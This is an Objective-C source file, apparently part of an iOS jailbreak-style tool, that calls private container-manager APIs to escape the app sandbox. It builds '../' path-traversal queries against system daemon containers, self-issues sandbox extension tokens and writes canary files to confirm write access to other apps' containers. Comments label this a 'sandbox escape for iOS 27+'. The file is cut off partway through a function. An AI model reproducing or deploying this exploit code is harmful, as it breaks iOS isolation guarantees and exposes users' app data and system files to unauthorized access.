#import "DavizinMCM.h"
#import "kexploit/bad_query.h"
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <stdlib.h>
#import <unistd.h>
#import <xpc/xpc.h>
#import <fcntl.h>
#import <os/lock.h>
#import <dirent.h>

#pragma mark - C API types (container_query_* from libsystem_containermanager)

typedef void *(*MCMQueryCreate_t)(void);
typedef void  (*MCMQuerySetU64_t)(void *, uint64_t);
typedef void  (*MCMQuerySetXPC_t)(void *, xpc_object_t);
typedef void  (*MCMQuerySetCString_t)(void *, const char *);
typedef void *(*MCMQueryGetSingle_t)(void *);
typedef void *(*MCMQueryGetError_t)(void *);
typedef bool  (*MCMQueryIterate_t)(void *, bool (^)(void *));
typedef void  (*MCMQueryFree_t)(void *);
typedef const char *(*MCMObjectGetPath_t)(void *);
typedef const char *(*MCMObjectGetIdentifier_t)(void *);
typedef void *(*MCMObjectCopy_t)(void *);
typedef char *(*MCMObjectCopyToken_t)(void *);
typedef bool  (*MCMObjectActivate_t)(void *, bool);
typedef void  (*MCMObjectFree_t)(void *);
typedef int   (*MCMErrorGetPOSIX_t)(void *);
typedef const char *(*MCMErrorGetMessage_t)(void *);

typedef struct {
    void *handle;
    MCMQueryCreate_t    queryCreate;
    MCMQuerySetU64_t    querySetClass;
    MCMQuerySetXPC_t    querySetIdentifiers;
    MCMQuerySetXPC_t    querySetGroupIdentifiers;
    MCMQuerySetU64_t    querySetFlags;
    MCMQuerySetU64_t    querySetPart;
    MCMQuerySetCString_t querySetPartDomain;
    MCMQueryGetSingle_t queryGetSingle;
    MCMQueryGetError_t  queryGetLastError;
    MCMQueryIterate_t   queryIterate;
    MCMQueryFree_t      queryFree;
    MCMObjectGetPath_t  objectGetPath;
    MCMObjectGetIdentifier_t objectGetIdentifier;
    MCMObjectCopy_t     objectCopy;
    MCMObjectCopyToken_t objectCopyToken;
    MCMObjectActivate_t objectActivate;
    MCMObjectFree_t     objectFree;
    MCMErrorGetPOSIX_t  errorGetPOSIX;
    MCMErrorGetMessage_t errorGetMessage;
} MCMAPI;

static MCMAPI *MCMGetAPI(void) {
    static MCMAPI api;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        api.handle = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                            RTLD_NOW | RTLD_LOCAL);
        void *h = api.handle ? api.handle : RTLD_DEFAULT;
#define LOAD(f, sym) api.f = (__typeof(api.f))dlsym(h, sym)
        LOAD(queryCreate,            "container_query_create");
        LOAD(querySetClass,          "container_query_set_class");
        LOAD(querySetIdentifiers,    "container_query_set_identifiers");
        LOAD(querySetGroupIdentifiers,"container_query_set_group_identifiers");
        LOAD(querySetFlags,          "container_query_operation_set_flags");
        LOAD(querySetPart,           "container_query_operation_set_part");
        LOAD(querySetPartDomain,     "container_query_operation_set_part_domain");
        LOAD(queryGetSingle,         "container_query_get_single_result");
        LOAD(queryGetLastError,      "container_query_get_last_error");
        LOAD(queryIterate,           "container_query_iterate_results_sync");
        LOAD(queryFree,              "container_query_free");
        LOAD(objectGetPath,          "container_object_get_path");
        LOAD(objectGetIdentifier,    "container_object_get_identifier");
        LOAD(objectCopy,             "container_object_copy");
        LOAD(objectCopyToken,        "container_copy_sandbox_token");
        LOAD(objectActivate,         "container_object_sandbox_extension_activate");
        LOAD(objectFree,             "container_object_free");
        LOAD(errorGetPOSIX,          "container_error_get_posix_errno");
        LOAD(errorGetMessage,        "container_error_get_message");
#undef LOAD
    });
    return &api;
}

#pragma mark - Lease storage (C-based, avoids NSMutableDictionary crash on iOS 27)

typedef struct {
    void *query;
    void *activation;
    char  bundleID[256];
    char  path[1024];
    bool  active;
} MCMLease;

#define MAX_LEASES 8
static MCMLease sLeases[MAX_LEASES];
static os_unfair_lock sLeaseLock = OS_UNFAIR_LOCK_INIT;

static MCMLease *findLease(const char *bundleID) {
    for (int i = 0; i < MAX_LEASES; i++) {
        if (sLeases[i].active && strcmp(sLeases[i].bundleID, bundleID) == 0)
            return &sLeases[i];
    }
    return NULL;
}

static MCMLease *allocLease(void) {
    for (int i = 0; i < MAX_LEASES; i++) {
        if (!sLeases[i].active) return &sLeases[i];
    }
    return &sLeases[0];
}

#pragma mark - Logging

static inline void DavizinMCMLog(NSString *msg) {
    NSLog(@"[DavizinMCM] %@", msg);
}

#pragma mark - Forward declarations

static void _storeLease(MCMAPI *api, void *q, void *act, const char *bid, const char *path);
static BOOL _mcmProbeCanWrite(const char *dirPath);

#pragma mark - worse_query: scoped MCM partDomain traversal (Filza technique)

static const uint64_t kMCMReadWritePartFlags = 0x8100000000ULL;

typedef struct {
    uint64_t cls;
    const char *identifier;
    bool group;
    uint64_t part;
    int depth;
    const char *label;
} WQAnchor;

static const WQAnchor kWQAnchors[] = {
    { 12, "com.apple.geod",                              false, 3, 6, "C12-geod" },
    { 13, "systemgroup.com.apple.mobilegestaltcache",     true,  3, 6, "C13-gestalt" },
    { 13, "systemgroup.com.apple.installcoordinationd",   true,  3, 6, "C13-install" },
    { 12, "com.apple.eligibilityd",                       false, 3, 6, "C12-eligib" },
    { 13, "systemgroup.com.apple.configurationprofiles",  true,  0, 4, "C13-config" },
    { 10, "com.apple.swcd",                               false, 0, 4, "C10-swcd" },
    { 10, "com.apple.lsd",                                false, 0, 4, "C10-lsd" },
    { 15, "com.apple.appmanagedfeaturesd",                false, 0, 4, "C15-appman" },
};
static const int kWQAnchorCount = sizeof(kWQAnchors) / sizeof(kWQAnchors[0]);

static int64_t _worseQueryGrant(const char *targetPath, const char *leaseLabel) {
    MCMAPI *api = MCMGetAPI();
    if (!api->queryCreate || !api->querySetPartDomain || !api->queryGetSingle ||
        !api->objectCopy || !api->objectActivate)
        return -1;

    const char *relPath = NULL;
    if (strncmp(targetPath, "/private/var/", 13) == 0)
        relPath = targetPath + 13;
    else if (strncmp(targetPath, "/var/", 5) == 0)
        relPath = targetPath + 5;
    else
        return -1;

    for (int i = 0; i < kWQAnchorCount; i++) {
        const WQAnchor *a = &kWQAnchors[i];

        char domain[2048];
        domain[0] = '\0';
        for (int d = 0; d < a->depth; d++) {
            if (d == 0) strlcat(domain, "..", sizeof(domain));
            else strlcat(domain, "/..", sizeof(domain));
        }
        strlcat(domain, "/", sizeof(domain));
        strlcat(domain, relPath, sizeof(domain));

        void *q = api->queryCreate();
        if (!q) continue;

        api->querySetClass(q, a->cls);
        xpc_object_t xid = xpc_string_create(a->identifier);
        if (a->group && api->querySetGroupIdentifiers)
            api->querySetGroupIdentifiers(q, xid);
        else
            api->querySetIdentifiers(q, xid);
        api->querySetFlags(q, kMCMReadWritePartFlags);
        if (api->querySetPart) api->querySetPart(q, a->part);
        api->querySetPartDomain(q, domain);

        void *res = api->queryGetSingle(q);
        if (res) {
            void *act = api->objectCopy(res);
            if (act) {
                char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
                bool hasToken = token && token[0] != '\0';
                bool activated = hasToken && api->objectActivate(act, false);
                free(token);

                int fd = open(targetPath, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
                if (fd >= 0) {
                    close(fd);
                    DavizinMCMLog([NSString stringWithFormat:
                        @"[WQ] %s tok=%d act=%d → open OK para %s", a->label, hasToken, activated, targetPath]);
                    _storeLease(api, q, act, leaseLabel ?: a->identifier, targetPath);
                    xpc_release(xid);
                    return 9100 + i;
                }
                if (api->objectFree) api->objectFree(act);
            }
        } else {
            void *qErr = api->queryGetLastError ? api->queryGetLastError(q) : NULL;
            int posix = qErr && api->errorGetPOSIX ? api->errorGetPOSIX(qErr) : 0;
            NSLog(@"[WQ] %s: NULL posix=%d domain=%s", a->label, posix, domain);
        }

        xpc_release(xid);
        api->queryFree(q);
    }

    return -1;
}

#pragma mark - bad_query grant helpers

static inline BOOL shouldUseBadQuery(void) {
    NSOperatingSystemVersion osVersion = [[NSProcessInfo processInfo] operatingSystemVersion];
    return osVersion.majorVersion >= 26;
}

static const char *kAppGroups[] = {
    "group.a8b3cf4e91d07562.1",
    "group.a8b3cf4e91d07562.2",
    "group.a8b3cf4e91d07562.3",
};
static const int kAppGroupCount = 3;

int64_t DavizinGrantContainerAccess(const char *containerPath) {
    if (!shouldUseBadQuery()) {
        return -1;
    }

    NSString *cleanPath = [NSString stringWithUTF8String:containerPath];
    if ([cleanPath hasSuffix:@"/"]) {
        cleanPath = [cleanPath substringToIndex:cleanPath.length - 1];
    }

    const char *pathC = [cleanPath UTF8String];

    // Strategy WQ: worse_query — scoped MCM partDomain traversal (primary for iOS 27.2)
    {
        int64_t wqHandle = _worseQueryGrant(pathC, "wq-grant");
        if (wqHandle >= 0) {
            DavizinMCMLog([NSString stringWithFormat:@"Grant WQ para %@: handle=%lld", cleanPath, wqHandle]);
            return wqHandle;
        }
    }

    // Strategy 0: MCM class-7 app group native activation (Filza technique)
    // Activating an app group sandbox extension may grant access to the target path
    MCMAPI *api = MCMGetAPI();
    if (api->queryCreate && api->querySetGroupIdentifiers && api->objectActivate) {
        for (int g = 0; g < kAppGroupCount; g++) {
            static const uint64_t kGrantFlags[] = { 0x900000000ULL, 0x8100000000ULL };
            for (int fi = 0; fi < 2; fi++) {
                void *q = api->queryCreate();
                if (!q) continue;
                api->querySetClass(q, 7);
                xpc_object_t xid = xpc_string_create(kAppGroups[g]);
                api->querySetGroupIdentifiers(q, xid);
                api->querySetFlags(q, kGrantFlags[fi]);
                if (api->querySetPart) api->querySetPart(q, 0);
                void *res = api->queryGetSingle(q);
                if (res && api->objectCopy) {
                    void *act = api->objectCopy(res);
                    if (act) {
                        char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
                        bool activated = false;
                        if (token && token[0] != '\0')
                            activated = api->objectActivate(act, false);
                        free(token);
                        if (activated) {
                            int fd = open(pathC, O_RDONLY | O_CLOEXEC);
                            if (fd >= 0) {
                                close(fd);
                                DavizinMCMLog([NSString stringWithFormat:
                                    @"Grant MCM C7[%d] f=%d activado → acceso OK para %@", g, fi, cleanPath]);
                                // Keep query+activation alive, return sentinel handle
                                _storeLease(api, q, act, kAppGroups[g], pathC);
                                xpc_release(xid);
                                return 9000 + g;
                            }
                        }
                        if (api->objectFree) api->objectFree(act);
                    }
                }
                xpc_release(xid);
                api->queryFree(q);
            }
        }
    }

    // Strategy 1: Class 13 (system group) — original approach
    int64_t handle = bad_query((char *)pathC, true, NULL, false);
    if (handle >= 0) {
        DavizinMCMLog([NSString stringWithFormat:@"Grant class13 para %@: handle=%lld", cleanPath, handle]);
        return handle;
    }

    // Strategy 2: Class 7 (app group) via bad_query — XO Files approach for iOS 27+
    for (int g = 0; g < kAppGroupCount; g++) {
        handle = bad_query((char *)pathC, true, (char *)kAppGroups[g], false);
        if (handle >= 0) {
            DavizinMCMLog([NSString stringWithFormat:@"Grant appGroup[%d] para %@: handle=%lld", g, cleanPath, handle]);
            return handle;
        }
        handle = bad_query((char *)pathC, false, (char *)kAppGroups[g], false);
        if (handle >= 0) {
            DavizinMCMLog([NSString stringWithFormat:@"Grant appGroup[%d]-noCreate para %@: handle=%lld", g, cleanPath, handle]);
            return handle;
        }
    }

    DavizinMCMLog([NSString stringWithFormat:@"Grant FALLÓ todas las estrategias para %@", cleanPath]);
    return -1;
}

void DavizinReleaseContainerGrant(int64_t handle) {
    if (handle >= 9000) {
        // MCM lease handle — kept alive in sLeases, don't release via bad_query
        return;
    }
    if (handle >= 0) {
        bad_query_release(handle);
    }
}

#pragma mark - Container path lookup (direct C API with persistent lease)

NSString *DavizinGetContainerPath(NSString *bundleID, NSString **outError) {
    static const NSString *kRequiredID = @"com.apple.mobile.MobileHouseArrest";
    static const uint64_t kFlags = 0x900000000ULL;
    static const uint64_t kClass = 2;

    if (!bundleID || bundleID.length == 0) {
        if (outError) *outError = @"bundleID es nil o vacío";
        return nil;
    }

    NSString *currentID = NSBundle.mainBundle.bundleIdentifier;
    if (![currentID isEqualToString:(NSString *)kRequiredID]) {
        if (outError) *outError = [NSString stringWithFormat:
            @"Bundle ID: '%@'", currentID];
        return nil;
    }

    const char *bid = bundleID.UTF8String;

    os_unfair_lock_lock(&sLeaseLock);
    MCMLease *existing = findLease(bid);
    if (existing && existing->path[0]) {
        NSString *cachedPath = [NSString stringWithUTF8String:existing->path];
        os_unfair_lock_unlock(&sLeaseLock);
        return cachedPath;
    }
    os_unfair_lock_unlock(&sLeaseLock);

    MCMAPI *api = MCMGetAPI();
    if (!api->queryCreate || !api->queryGetSingle || !api->objectGetPath) {
        if (outError) *outError = @"containermanager no disponible";
        return nil;
    }

    // Single query with activation flags — matches MCMRetainedLease pattern exactly
    void *query = api->queryCreate();
    if (!query) {
        if (outError) *outError = @"query_create devolvió NULL";
        return nil;
    }

    api->querySetClass(query, kClass);
    xpc_object_t xpcID = xpc_string_create(bid);
    api->querySetIdentifiers(query, xpcID);
    api->querySetFlags(query, kFlags);
    if (api->querySetPart) api->querySetPart(query, 0);

    void *result = api->queryGetSingle(query);
    if (!result) {
        void *qErr = api->queryGetLastError ? api->queryGetLastError(query) : NULL;
        int posix = qErr && api->errorGetPOSIX ? api->errorGetPOSIX(qErr) : 0;
        const char *msg = qErr && api->errorGetMessage ? api->errorGetMessage(qErr) : NULL;
        if (outError) *outError = [NSString stringWithFormat:
            @"No encontrado '%@' posix=%d %s", bundleID, posix, msg ?: ""];
        DavizinMCMLog([NSString stringWithFormat:@"Container no encontrado para %@: posix=%d", bundleID, posix]);
        api->queryFree(query);
        return nil;
    }

    const char *rawPath = api->objectGetPath(result);
    NSString *path = rawPath ? [NSString stringWithUTF8String:rawPath] : nil;

    if (path.length == 0 || !path.isAbsolutePath) {
        if (outError) *outError = @"Path inválido";
        api->queryFree(query);
        return nil;
    }

    if ([path isEqualToString:@"/var"] || [path hasPrefix:@"/var/"])
        path = [@"/private" stringByAppendingString:path];

    // Activate sandbox extension and keep it alive (same as MCMRetainedLease.activate)
    void *activation = api->objectCopy ? api->objectCopy(result) : NULL;
    if (activation) {
        char *token = api->objectCopyToken ? api->objectCopyToken(activation) : NULL;
        bool activated = false;
        if (token && token[0] != '\0') {
            activated = api->objectActivate(activation, false);
        }
        free(token);

        if (activated) {
            os_unfair_lock_lock(&sLeaseLock);
            MCMLease *lease = allocLease();
            if (lease->active && lease->query) {
                if (lease->activation && api->objectFree) api->objectFree(lease->activation);
                api->queryFree(lease->query);
            }
            lease->query = query;
            lease->activation = activation;
            strlcpy(lease->bundleID, bid, sizeof(lease->bundleID));
            strlcpy(lease->path, path.UTF8String, sizeof(lease->path));
            lease->active = true;
            os_unfair_lock_unlock(&sLeaseLock);

            DavizinMCMLog([NSString stringWithFormat:@"Lease ACTIVADA para %@: %@", bundleID, path]);
            return path;
        } else {
            if (api->objectFree) api->objectFree(activation);
        }
    }

    // Activation failed but path is valid — keep query alive anyway, bad_query might work
    DavizinMCMLog([NSString stringWithFormat:@"Container encontrado (sin lease) para %@: %@", bundleID, path]);
    api->queryFree(query);
    return path;
}

#pragma mark - Probe: VPN-free sandbox escape for iOS 27+

typedef int64_t (*SandboxExtConsumeFunc)(const char *);
typedef int64_t (*SandboxExtReleaseFunc)(int64_t);
typedef char   *(*SandboxIssueFileFunc)(const char *, const char *, uint32_t);
typedef char   *(*SandboxIssueFilePidFunc)(const char *, const char *, uint32_t, pid_t);
typedef int     (*SandboxCheckFunc)(pid_t, const char *, int, ...);
#define SANDBOX_FILTER_PATH 1

static char sProbeDiag[8192] = "";
static int  sProbeDiagLen = 0;

static void _probeDiagReset(void) { sProbeDiag[0] = '\0'; sProbeDiagLen = 0; }
static void _probeDiagAppend(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
static void _probeDiagAppend(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    int remaining = (int)sizeof(sProbeDiag) - sProbeDiagLen - 1;
    if (remaining > 0) {
        int n = vsnprintf(sProbeDiag + sProbeDiagLen, remaining, fmt, ap);
        if (n > 0) sProbeDiagLen += (n < remaining ? n : remaining);
    }
    va_end(ap);
}

const char *DavizinLastProbeDiagnostic(void) {
    return sProbeDiag;
}

static BOOL _mcmProbeCanWrite(const char *dirPath) {
    char canary[1200];
    snprintf(canary, sizeof(canary), "%s/.mcm_probe_canary", dirPath);
    FILE *f = fopen(canary, "w");
    if (!f) return NO;
    fprintf(f, "mcmprobe");
    fclose(f);
    f = fopen(canary, "r");
    if (!f) { unlink(canary); return NO; }
    char buf[16] = {0};
    fread(buf, 1, 8, f);
    fclose(f);
    unlink(canary);
    return (strcmp(buf, "mcmprobe") == 0);
}

static void _storeLease(MCMAPI *api, void *q, void *act, const char *bid, const char *path) {
    os_unfair_lock_lock(&sLeaseLock);
    MCMLease *lease = allocLease();
    if (lease->active && lease->query) {
        if (lease->activation && api->objectFree) api->objectFree(lease->activation);
        api->queryFree(lease->query);
    }
    lease->query = q;
    lease->activation = act;
    strlcpy(lease->bundleID, bid, sizeof(lease->bundleID));
    strlcpy(lease->path, path, sizeof(lease->path));
    lease->active = true;
    os_unfair_lock_unlock(&sLeaseLock);
}

DavizinProbeResult DavizinProbeContainerWriteAccess(NSString *containerPath, NSString *bundleID) {
    DavizinProbeResult result = { .method = 0, .handle = -1, .writeOK = NO };
    result.detail[0] = '\0';
    _probeDiagReset();

    if (!containerPath || containerPath.length == 0 || !bundleID || bundleID.length == 0) {
        strlcpy(result.detail, "nil containerPath or bundleID", sizeof(result.detail));
        return result;
    }

    const char *pathC = containerPath.UTF8String;
    const char *bidC = bundleID.UTF8String;

    _probeDiagAppend("target=%s bid=%s | ", pathC, bidC);

    MCMAPI *api = MCMGetAPI();
    SandboxExtConsumeFunc consumeExt = (SandboxExtConsumeFunc)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    SandboxExtReleaseFunc releaseExt = (SandboxExtReleaseFunc)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    SandboxIssueFileFunc  issueFile  = (SandboxIssueFileFunc)dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file");
    SandboxIssueFilePidFunc issueFilePid = (SandboxIssueFilePidFunc)dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file_to_process_by_pid");
    SandboxCheckFunc sbCheck = (SandboxCheckFunc)dlsym(RTLD_DEFAULT, "sandbox_check");

    if (!consumeExt) {
        strlcpy(result.detail, "missing sandbox_extension_consume", sizeof(result.detail));
        return result;
    }

    // ── DIAGNOSTIC: Check current sandbox permissions ──
    if (sbCheck) {
        int canW = sbCheck(getpid(), "file-write-data", SANDBOX_FILTER_PATH, pathC);
        int canR = sbCheck(getpid(), "file-read-data", SANDBOX_FILTER_PATH, pathC);
        _probeDiagAppend("sb_check: write=%d read=%d | ", canW, canR);
        DavizinMCMLog([NSString stringWithFormat:@"[Probe] sandbox_check BEFORE: write=%d read=%d", canW, canR]);
        if (canW == 0 && _mcmProbeCanWrite(pathC)) {
            result.method = 99;
            result.handle = 0;
            result.writeOK = YES;
            strlcpy(result.detail, "sandbox already allows write (no escape needed)", sizeof(result.detail));
            _probeDiagAppend("*** ALREADY WRITABLE ***");
            return result;
        }
    }

    // ── DIAGNOSTIC: Code signing identity and platform binary status ──
    {
        typedef CFTypeRef SecTaskRef_t;
        SecTaskRef_t (*_stCreate)(CFAllocatorRef) =
            (SecTaskRef_t (*)(CFAllocatorRef))dlsym(RTLD_DEFAULT, "SecTaskCreateFromSelf");
        CFStringRef (*_stCopySign)(SecTaskRef_t, CFErrorRef *) =
            (CFStringRef (*)(SecTaskRef_t, CFErrorRef *))dlsym(RTLD_DEFAULT, "SecTaskCopySigningIdentifier");
        if (_stCreate && _stCopySign) {
            SecTaskRef_t task = _stCreate(kCFAllocatorDefault);
            if (task) {
                CFErrorRef cfErr = NULL;
                CFStringRef sid = _stCopySign(task, &cfErr);
                const char *sidC = sid ? [(__bridge NSString *)sid UTF8String] : "nil";
                _probeDiagAppend("sign_id=%s ", sidC);
                if (sid) CFRelease(sid);
                if (cfErr) CFRelease(cfErr);
                CFRelease(task);
            } else {
                _probeDiagAppend("sign_id=no_task ");
            }
        } else {
            _probeDiagAppend("sign_id=no_api ");
        }
        int (*_csops)(pid_t, unsigned int, void *, size_t) =
            (int (*)(pid_t, unsigned int, void *, size_t))dlsym(RTLD_DEFAULT, "csops");
        if (_csops) {
            uint32_t csf = 0;
            _csops(getpid(), 0, &csf, sizeof(csf));
            _probeDiagAppend("cs=0x%x(v=%d p=%d a=%d) ",
                csf, (csf & 0x1) != 0, (csf & 0x04000000) != 0, (csf & 0x2) != 0);
        }
        // Check which entitlements the kernel actually honors for this process
        typedef CFTypeRef SecTaskRef_t2;
        SecTaskRef_t2 (*_stCreate2)(CFAllocatorRef) =
            (SecTaskRef_t2 (*)(CFAllocatorRef))dlsym(RTLD_DEFAULT, "SecTaskCreateFromSelf");
        CFTypeRef (*_stCopyEnt)(SecTaskRef_t2, CFStringRef, CFErrorRef *) =
            (CFTypeRef (*)(SecTaskRef_t2, CFStringRef, CFErrorRef *))dlsym(RTLD_DEFAULT, "SecTaskCopyValueForEntitlement");
        if (_stCreate2 && _stCopyEnt) {
            SecTaskRef_t2 task2 = _stCreate2(kCFAllocatorDefault);
            if (task2) {
                static const char *ekeys[] = {
                    "com.apple.private.security.container-manager",
                    "com.apple.private.security.storage.AppDataContainers",
                    "com.apple.private.MobileContainerManager.allowed",
                    "platform-application",
                    "com.apple.private.security.no-container",
                };
                static const char *elabels[] = { "cm", "adc", "mcm", "pa", "nc" };
                _probeDiagAppend("ent:");
                for (int ei = 0; ei < 5; ei++) {
                    CFStringRef ekey = CFStringCreateWithCString(kCFAllocatorDefault, ekeys[ei], kCFStringEncodingUTF8);
                    CFTypeRef eval = _stCopyEnt(task2, ekey, NULL);
                    _probeDiagAppend("%s=%d ", elabels[ei], eval ? 1 : 0);
                    if (eval) CFRelease(eval);
                    CFRelease(ekey);
                }
                CFRelease(task2);
            }
        }
        _probeDiagAppend("| ");
    }

    // ── Strategy 0: sandbox_extension_issue_file (self-issued extension) ──
    // As com.apple.mobile.MobileHouseArrest, we may have entitlement to issue file extensions
    {
        static const char *kExtClasses[] = {
            "com.apple.app-sandbox.read-write",
            "com.apple.app-sandbox.read",
            "com.apple.sandbox.container",
            "com.apple.security.exception.files.absolute-path.read-write",
        };
        int nClasses = sizeof(kExtClasses) / sizeof(kExtClasses[0]);

        for (int ci = 0; ci < nClasses; ci++) {
            // 0a: sandbox_extension_issue_file
            if (issueFile) {
                char *token = issueFile(kExtClasses[ci], pathC, 0);
                _probeDiagAppend("S0a[%s]=%s | ", kExtClasses[ci], token ? "tok" : "nil");
                if (token) {
                    int64_t h = consumeExt(token);
                    if (h >= 0 && _mcmProbeCanWrite(pathC)) {
                        result.method = 3;
                        result.handle = h;
                        result.writeOK = YES;
                        snprintf(result.detail, sizeof(result.detail),
                                 "issue_file(%s) VERIFIED h=%lld", kExtClasses[ci], (long long)h);
                        _probeDiagAppend("*** SUCCESS S0a ***");
                        free(token);
                        return result;
                    }
                    if (h >= 0 && releaseExt) releaseExt(h);
                    free(token);
                }
            }
            // 0b: sandbox_extension_issue_file_to_process_by_pid (self)
            if (issueFilePid) {
                char *token = issueFilePid(kExtClasses[ci], pathC, 0, getpid());
                _probeDiagAppend("S0b[%s]=%s | ", kExtClasses[ci], token ? "tok" : "nil");
                if (token) {
                    int64_t h = consumeExt(token);
                    if (h >= 0 && _mcmProbeCanWrite(pathC)) {
                        result.method = 4;
                        result.handle = h;
                        result.writeOK = YES;
                        snprintf(result.detail, sizeof(result.detail),
                                 "issue_file_pid(%s) VERIFIED h=%lld", kExtClasses[ci], (long long)h);
                        _probeDiagAppend("*** SUCCESS S0b ***");
                        free(token);
                        return result;
                    }
                    if (h >= 0 && releaseExt) releaseExt(h);
                    free(token);
                }
            }
        }
    }

    // ── Strategy 1: MCM class-2 query → sandbox token ──
    if (api->queryCreate) {
        _probeDiagAppend("S1:MCM | ");
        void *q = api->queryCreate();
        if (q) {
            api->querySetClass(q, 2);
            xpc_object_t xid = xpc_string_create(bidC);
            api->querySetIdentifiers(q, xid);
            api->querySetFlags(q, 0x900000000ULL);
            if (api->querySetPart) api->querySetPart(q, 0);

            void *res = api->queryGetSingle(q);
            if (res) {
                // 1a: objectActivate(false)
                if (api->objectCopy && api->objectActivate) {
                    void *act = api->objectCopy(res);
                    if (act) {
                        bool ok = api->objectActivate(act, false);
                        _probeDiagAppend("1a=%d ", ok);
                        if (ok && _mcmProbeCanWrite(pathC)) {
                            result.method = 1; result.handle = 0; result.writeOK = YES;
                            strlcpy(result.detail, "MCM activate(false) VERIFIED", sizeof(result.detail));
                            _probeDiagAppend("*** SUCCESS 1a ***");
                            _storeLease(api, q, act, bidC, pathC);
                            xpc_release(xid);
                            return result;
                        }
                        if (api->objectFree) api->objectFree(act);
                    }
                }
                // 1b: objectActivate(true) — force mode
                if (api->objectCopy && api->objectActivate) {
                    void *act = api->objectCopy(res);
                    if (act) {
                        bool ok = api->objectActivate(act, true);
                        _probeDiagAppend("1b=%d ", ok);
                        if (ok && _mcmProbeCanWrite(pathC)) {
                            result.method = 1; result.handle = 0; result.writeOK = YES;
                            strlcpy(result.detail, "MCM activate(true) VERIFIED", sizeof(result.detail));
                            _probeDiagAppend("*** SUCCESS 1b ***");
                            _storeLease(api, q, act, bidC, pathC);
                            xpc_release(xid);
                            return result;
                        }
                        if (api->objectFree) api->objectFree(act);
                    }
                }
                // 1c: raw sandbox_extension_consume on the MCM sandbox token
                if (api->objectCopyToken) {
                    char *token = api->objectCopyToken(res);
                    if (token && token[0]) {
                        int64_t h = consumeExt(token);
                        _probeDiagAppend("1c:h=%lld ", (long long)h);
                        if (h >= 0 && _mcmProbeCanWrite(pathC)) {
                            result.method = 2; result.handle = h; result.writeOK = YES;
                            snprintf(result.detail, sizeof(result.detail),
                                     "MCM raw consume VERIFIED h=%lld", (long long)h);
                            _probeDiagAppend("*** SUCCESS 1c ***");
                            free(token);
                            _storeLease(api, q, NULL, bidC, pathC);
                            xpc_release(xid);
                            return result;
                        }
                        if (h >= 0 && releaseExt) releaseExt(h);
                    } else {
                        _probeDiagAppend("1c:no_token ");
                    }
                    free(token);
                }
                // 1d: Try open() directly after MCM query (implicit grant from containermanagerd)
                {
                    char testFile[1200];
                    snprintf(testFile, sizeof(testFile), "%s/.mcm_implicit_test", pathC);
                    int fd = open(testFile, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                    int fdErr = fd < 0 ? errno : 0;
                    _probeDiagAppend("1d:fd=%d(e=%d) ", fd, fdErr);
                    if (fd >= 0) {
                        const char *payload = "implicitOK";
                        write(fd, payload, 10);
                        close(fd);
                        FILE *vf = fopen(testFile, "r");
                        if (vf) {
                            char buf[16] = {0};
                            fread(buf, 1, 10, vf);
                            fclose(vf);
                            unlink(testFile);
                            if (strcmp(buf, "implicitOK") == 0) {
                                result.method = 5; result.handle = 0; result.writeOK = YES;
                                strlcpy(result.detail, "MCM implicit grant (open after query) VERIFIED", sizeof(result.detail));
                                _probeDiagAppend("*** SUCCESS 1d ***");
                                _storeLease(api, q, NULL, bidC, pathC);
                                xpc_release(xid);
                                return result;
                            }
                        }
                        unlink(testFile);
                    }
                }
            } else {
                _probeDiagAppend("S1:null_result ");
            }
            xpc_release(xid);
            api->queryFree(q);
        }
    }

    // ── Strategy 1.5: MCM with kMCMReadWritePartFlags (0x8100000000) ──
    if (api->queryCreate) {
        _probeDiagAppend("S1.5:RW | ");
        void *q = api->queryCreate();
        if (q) {
            api->querySetClass(q, 2);
            xpc_object_t xid = xpc_string_create(bidC);
            api->querySetIdentifiers(q, xid);
            api->querySetFlags(q, 0x8100000000ULL);
            if (api->querySetPart) api->querySetPart(q, 0);
            void *res = api->queryGetSingle(q);
            if (res) {
                if (api->objectCopy && api->objectActivate) {
                    void *act = api->objectCopy(res);
                    if (act) {
                        bool ok = api->objectActivate(act, false);
                        _probeDiagAppend("1.5a=%d ", ok);
                        if (ok && _mcmProbeCanWrite(pathC)) {
                            result.method = 6; result.handle = 0; result.writeOK = YES;
                            strlcpy(result.detail, "MCM RW-flags activate VERIFIED", sizeof(result.detail));
                            _probeDiagAppend("*** SUCCESS 1.5a ***");
                            _storeLease(api, q, act, bidC, pathC);
                            xpc_release(xid);
                            return result;
                        }
                        if (api->objectFree) api->objectFree(act);
                    }
                }
                if (api->objectCopyToken) {
                    char *token = api->objectCopyToken(res);
                    if (token && token[0]) {
                        int64_t h = consumeExt(token);
                        _probeDiagAppend("1.5b:h=%lld ", (long long)h);
                        if (h >= 0 && _mcmProbeCanWrite(pathC)) {
                            result.method = 6; result.handle = h; result.writeOK = YES;
                            snprintf(result.detail, sizeof(result.detail),
                                     "MCM RW-flags consume VERIFIED h=%lld", (long long)h);
                            _probeDiagAppend("*** SUCCESS 1.5b ***");
                            free(token); _storeLease(api, q, NULL, bidC, pathC);
                            xpc_release(xid);
                            return result;
                        }
                        if (h >= 0 && releaseExt) releaseExt(h);
                    }
                    free(token);
                }
            }
            xpc_release(xid);
            api->queryFree(q);
        }
    }

    // ── Strategy 1.6: MCM with different part values (1,2,3) ──
    if (api->queryCreate && api->querySetPart) {
        static const uint64_t kFlagSets[] = { 0x900000000ULL, 0x8100000000ULL };
        for (int fi = 0; fi < 2; fi++) {
            for (uint64_t part = 1; part <= 3; part++) {
                void *q = api->queryCreate();
                if (!q) continue;
                api->querySetClass(q, 2);
                xpc_object_t xid = xpc_string_create(bidC);
                api->querySetIdentifiers(q, xid);
                api->querySetFlags(q, kFlagSets[fi]);
                api->querySetPart(q, part);

                void *res = api->queryGetSingle(q);
                if (res && api->objectCopyToken) {
                    char *token = api->objectCopyToken(res);
                    if (token && token[0]) {
                        int64_t h = consumeExt(token);
                        _probeDiagAppend("S1.6f%dp%llu:h=%lld ", fi, (unsigned long long)part, (long long)h);
